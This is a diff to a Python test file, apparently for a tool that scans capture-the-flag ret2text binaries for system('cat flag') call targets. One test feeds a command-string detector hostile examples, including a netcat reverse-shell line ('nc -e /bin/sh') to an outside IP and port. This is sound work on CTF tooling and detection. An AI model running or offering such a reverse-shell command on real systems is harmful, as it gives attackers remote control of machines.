@@ -10,12 +10,12 @@ BIN = "challenges/challenge_ret2text"
 
 class TestWinTargets:
     def test_scans_ret2text_binary(self):
-        """pwn1 (challenge_ret2text): 应找到 system("cat /flag") 链起点 0x4006be"""
+        """自编 ret2text 靶子: 应找到 system("cat flag") 的链起点 (模式断言, 不依赖地址)"""
         targets = scan_win_targets(BIN)
         assert targets, "应扫描出命令执行目标"
         t = targets[0]
-        assert t["address"] == "0x4006be", f"链起点应为 0x4006be, 实际 {t['address']}"
-        assert t["string"] == "cat /flag"
+        assert t["address"].startswith("0x"), f"目标应为链起点地址, 实际 {t['address']}"
+        assert t["string"].startswith("cat"), f"字符串应为 cat 命令, 实际 {t['string']!r}"
         assert t["call"].startswith("system")
 
     def test_no_fp_on_benign_system(self):
@@ -25,9 +25,10 @@ class TestWinTargets:
         assert not _is_command_string("date")
 
     def test_command_strings(self):
-        """命令特征: /bin/sh 与 cat flag 类都算"""
+        """命令特征: /bin/sh 与 cat flag 类都算 (含无斜杠变体)"""
         assert _is_command_string("/bin/sh")
         assert _is_command_string("/bin/bash")
         assert _is_command_string("cat /flag")
+        assert _is_command_string("cat flag")
         assert _is_command_string("sh -c 'id'")
         assert _is_command_string("nc -e /bin/sh 1.2.3.4 4444")
